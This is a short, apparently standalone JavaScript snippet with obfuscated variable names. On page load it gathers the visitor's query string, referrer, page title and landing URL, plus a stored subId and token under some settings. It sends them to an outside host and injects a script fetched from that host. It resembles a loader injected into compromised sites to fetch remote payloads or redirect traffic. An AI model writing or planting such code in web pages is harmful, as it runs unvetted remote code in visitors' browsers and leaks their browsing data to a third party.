
    (function() {
    var name = '_vcccHrn1gr4QJPWc';
    if (!window._vcccHrn1gr4QJPWc) {
        window._vcccHrn1gr4QJPWc = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://whhasd.com/RWkgGGFc',
            P_PATH: 'https://whhasd.com/248f7cb/postback',
        };
    }
    const _8JLSSWmxynhr3SQ8 = localStorage.getItem('config');
    if (typeof _8JLSSWmxynhr3SQ8 !== 'undefined' && _8JLSSWmxynhr3SQ8 !== null) {
        var _5Rzy6j81gsJRbwGq = JSON.parse(_8JLSSWmxynhr3SQ8);
        var _GhmVM42RHFNng2xR = Math.round(+new Date()/1000);
        if (_5Rzy6j81gsJRbwGq.created_at + window._vcccHrn1gr4QJPWc.ttl < _GhmVM42RHFNng2xR) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _j3KWLYWcSyNLkhDM = localStorage.getItem('subId');
    var _KyFKNyxwpQrF5mMK = localStorage.getItem('token');
    var _HRzZMkKZ7rGtYNRh = '?return=js.client';
        _HRzZMkKZ7rGtYNRh += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _HRzZMkKZ7rGtYNRh += '&se_referrer=' + encodeURIComponent(document.referrer);
        _HRzZMkKZ7rGtYNRh += '&default_keyword=' + encodeURIComponent(document.title);
        _HRzZMkKZ7rGtYNRh += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _HRzZMkKZ7rGtYNRh += '&name=' + encodeURIComponent(name);
        _HRzZMkKZ7rGtYNRh += '&host=' + encodeURIComponent(window._vcccHrn1gr4QJPWc.R_PATH);
    if (typeof _j3KWLYWcSyNLkhDM !== 'undefined' && _j3KWLYWcSyNLkhDM && window._vcccHrn1gr4QJPWc.unique) {
        _HRzZMkKZ7rGtYNRh += '&sub_id=' + encodeURIComponent(_j3KWLYWcSyNLkhDM);
    }
    if (typeof _KyFKNyxwpQrF5mMK !== 'undefined' && _KyFKNyxwpQrF5mMK && window._vcccHrn1gr4QJPWc.unique) {
        _HRzZMkKZ7rGtYNRh += '&token=' + encodeURIComponent(_KyFKNyxwpQrF5mMK);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._vcccHrn1gr4QJPWc.R_PATH + _HRzZMkKZ7rGtYNRh;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })(); 
  
